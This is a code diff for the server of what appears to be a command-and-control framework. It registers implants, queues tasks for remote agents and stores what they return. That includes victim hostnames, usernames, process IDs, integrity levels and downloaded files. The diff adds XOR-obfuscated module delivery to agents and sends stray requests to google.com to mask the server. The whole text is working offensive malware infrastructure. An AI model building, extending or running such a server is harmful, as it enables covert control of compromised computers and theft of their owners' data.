@@ -2,12 +2,13 @@ import datetime
 import json
 import os
 
-from connect.server.models import db, StagerModel, AgentModel, JobModel, ImplantModel
+from connect.server.models import db, StagerModel, AgentModel, TaskModel, ImplantModel
 from connect.generate import digit_identifier, string_identifier
-from connect.output import print_traceback, print_error
-from connect.convert import base64_to_string, base64_to_bytes, string_to_base64
+from connect.output import print_traceback, print_debug
+from connect.convert import base64_to_string, base64_to_bytes, string_to_base64, xor_base64
 from flask_socketio import emit, disconnect, SocketIO
 from flask import Blueprint, request, jsonify, redirect
+from sqlalchemy import desc
 
 check_in = Blueprint('check_in', __name__)
 key = digit_identifier()
@@ -25,48 +26,53 @@ def _commit(models: list):
     db.session.commit()
 
 
-def _retrieve_error(job, error):
-    job.result = error['message']
-    job.completed = datetime.datetime.now()
-    _commit([job])
+def _retrieve_error(task, error):
+    task.result = error['message']
+    task.completed = datetime.datetime.now()
+    _commit([task])
 
 
-def _retrieve_results(job, result):
-    agent = job.agent
+def _retrieve_results(task, result, errno):
+    agent = task.agent
 
     # A batch result is reserved to set agent properties.
-    if isinstance(result, list):
+    if isinstance(result, list) and errno == 'results':
         _result = result[0]
         _property = base64_to_string(result[1])
-        if job.name == 'hostname':
+        if task.name == 'hostname':
             agent.hostname = _property
-        if job.name == 'whoami':
+        if task.name == 'whoami':
             agent.username = _property
-        if job.name == 'pid':
+        if task.name == 'pid':
             agent.pid = _property
-        if job.name == 'integrity':
+        if task.name == 'integrity':
             agent.integrity = _property
-        if job.name == 'set sleep':
+        if task.name == 'set sleep':
             agent.sleep = _property
-        if job.name == 'set jitter':
+        if task.name == 'set jitter':
             agent.jitter = _property
     else:
         _result = result
 
-    if job.type == 1 or job.type == -1:
-        job.results = base64_to_string(_result)
-        websocket.emit('job_results', f'{{"banner":"{job.name.title()} job results from {agent.name}:",'
-                                      f'"results":"{_result}"}}')
-    if job.type == 2 or job.type == -2:
+    # negative task types don't emmit data.
+    # task type "1/-1" saves the results as a string (string data)
+    # task type "2/-2" saves the filename where the results were saved to (bystream data)
+    if task.type == 1 or task.type == -1:
+        task.results = base64_to_string(_result)
+        if task.type > 0:
+            websocket.emit(f'task_{errno}', f'{{"banner":"Task results from {agent.name}:",'
+                                            f'"results":"{_result}"}}')
+    if task.type == 2 or task.type == -2:
         file = base64_to_bytes(_result)
         filename = f'{os.getcwd()}/.backup/downloads/{string_identifier()}'
-        job.results = filename
+        task.results = filename
         with open(filename, 'wb') as fd:
             fd.write(file)
-        websocket.emit('job_results', f'{{"banner":"Wrote {job.name.title()} job results from {agent.name} to:",'
-                                      f'"results":"{string_to_base64(filename)}"}}')
-    job.completed = datetime.datetime.now()
-    _commit([agent, job])
+        if task.type > 0:
+            websocket.emit(f'task_{errno}', f'{{"banner":"Wrote task results from {agent.name} to:",'
+                                            f'"results":"{string_to_base64(filename)}"}}')
+    task.completed = datetime.datetime.now()
+    _commit([agent, task])
 
 
 def _connected_notification(agent):
@@ -80,25 +86,25 @@ def _connected_notification(agent):
     _commit([agent])
 
 
-def _retrieve_unsent_jobs(job):
+def _retrieve_unsent_tasks(task):
     """
-    If the job is a check_in then we need to grab uncompleted jobs for the agent.
+    If the task is a check_in then we need to grab uncompleted tasks for the agent.
 
-    :param job:
+    :param task:
     :return:
     """
-    _unsent_jobs = []
-    agent = job.agent
+    _unsent_tasks = []
+    agent = task.agent
     _connected_notification(agent)
-    for unsent_job in agent.jobs:
-        if unsent_job.sent:
+    for unsent_task in agent.tasks:
+        if unsent_task.sent:
             continue
-        websocket.emit('job_sent', f'Sent job {unsent_job.name.title()} to {agent.name}')
-        unsent_job.sent = datetime.datetime.now()
-        _commit([unsent_job])
-        _unsent_jobs.append({"jsonrpc": "2.0", "name": unsent_job.name, "arguments": unsent_job.arguments,
-                             "id": str(unsent_job.identifier)})
-    return _unsent_jobs
+        websocket.emit('task_sent', f'Tasked agent {agent.name} to {unsent_task.description}.')
+        unsent_task.sent = datetime.datetime.now()
+        _commit([unsent_task])
+        _unsent_tasks.append({"jsonrpc": "2.0", "name": unsent_task.name, "arguments": unsent_task.arguments,
+                             "id": str(unsent_task.identifier)})
+    return _unsent_tasks
 
 
 @check_in.route('/<path:uri>', methods=['GET', 'POST'])
@@ -108,39 +114,44 @@ def endpoint(uri):
 
     :param uri: The URI requested.
     """
+
     implant_key = request.get_data().decode('utf-8')
     implant = ImplantModel.query.filter_by(key=implant_key).first()
+
     if implant:
         agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
-        check_in_job = JobModel(name='check_in', agent=agent, type=-1)
-        check_in_job.completed = datetime.datetime.now()
-        check_in_job.sent = datetime.datetime.now()
-        _commit([agent, check_in_job])
-        batch_request = [{"jsonrpc": "2.0", "name": check_in_job.name, "arguments": check_in_job.arguments,
-                          "id": str(check_in_job.identifier)}]
+        check_in_task = TaskModel(name='check_in', description='check in', agent=agent, type=-1)
+        check_in_task.completed = datetime.datetime.now()
+        check_in_task.sent = datetime.datetime.now()
+        _commit([agent, check_in_task])
+        batch_request = [{"jsonrpc": "2.0", "name": check_in_task.name, "arguments": check_in_task.arguments,
+                          "id": str(check_in_task.identifier)}]
         return jsonify(batch_request)
 
     try:
-        batch_response = request.get_json(force=True)
+        if not request.get_data():
+            return redirect("https://www.google.com")
+        batch_response = request.get_json(force=True)        
     except Exception as e:
-        print_error(f'Failed to parse JSON-RPC 2.0 Batch Response: {request.get_data()} {uri} : {e}')
+        print_debug(f'Failed to parse JSON: {request.get_data()} {uri} : {e}', debug_mode)
         return redirect("https://www.google.com")
 
     try:
         batch_request = []
-        for job in batch_response:
-            job_id = job['id'] if 'id' in job.keys() else None
-            job_result = job['result'] if 'result' in job.keys() else None
-            job_error = job['error'] if 'error' in job.keys() else None
-            job = JobModel.query.filter_by(identifier=job_id).first()
-            if not job:
+        for task in batch_response:
+            task_id = task['id'] if 'id' in task.keys() else None
+            task_result = task['result'] if 'result' in task.keys() else None
+            task_error = task['error'] if 'error' in task.keys() else None
+            task = TaskModel.query.filter_by(identifier=task_id).first()
+            if not task:
                 return redirect("https://www.google.com")
-            if job_result:
-                _retrieve_results(job, job_result)
-            if job_error:
-                _retrieve_error(job, job_error)
-            if job.name == 'check_in':
-                batch_request.extend(_retrieve_unsent_jobs(job))
+            
+            if task_result:
+                _retrieve_results(task, task_result, 'results')
+            if task_error:
+                _retrieve_results(task, task_error['message'], 'error')
+            if task.name == 'check_in':
+                batch_request.extend(_retrieve_unsent_tasks(task))
         return jsonify(batch_request)
     except Exception:
         print_traceback()
@@ -162,7 +173,6 @@ def implants(data):
     """
     This event emits all current implants within the database to the client.
     """
-    print('implants')
     if not data:
         _implants = [_implant.get_implant() for _implant in ImplantModel.query.all()]
         emit('implants', {'implants': _implants}, broadcast=False)
@@ -194,15 +204,23 @@ def stagers():
     emit('stagers', {'stagers': _stagers, 'server_uri': request.host_url}, broadcast=False)
 
 
-def new_job(data):
+def new_task(data):
     """
-    This event schedules a new job to be sent to the agent.
+    This event schedules a new task to be sent to the agent.
     The *data* excpeted is {'name':'', 'agent_name':'', 'arguments':'', type:''}
 
     :param data:
     """
-    # todo Server-Side checks for job availability
+    # todo Server-Side checks for task availability
     data = json.loads(data)
     agent = AgentModel.query.filter_by(name=data['agent_name']).first()
-    job = JobModel(name=data['name'], agent=agent, arguments=data['arguments'], type=data['type'])
-    _commit([job])
+    available_modules = agent.implant.available_modules
+    method_name = data['name']
+    if method_name in available_modules.keys():
+        module = available_modules[method_name]
+        with open(f'{os.getcwd()}{module}', 'rb') as fd:
+            key, file = xor_base64(fd.read())
+        task = TaskModel(name='load', description=f'load module for {method_name}', agent=agent, arguments=f'{key},{file},{string_to_base64(method_name)}', type='1')
+        _commit([task])
+    task = TaskModel(name=method_name, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
+    _commit([task])
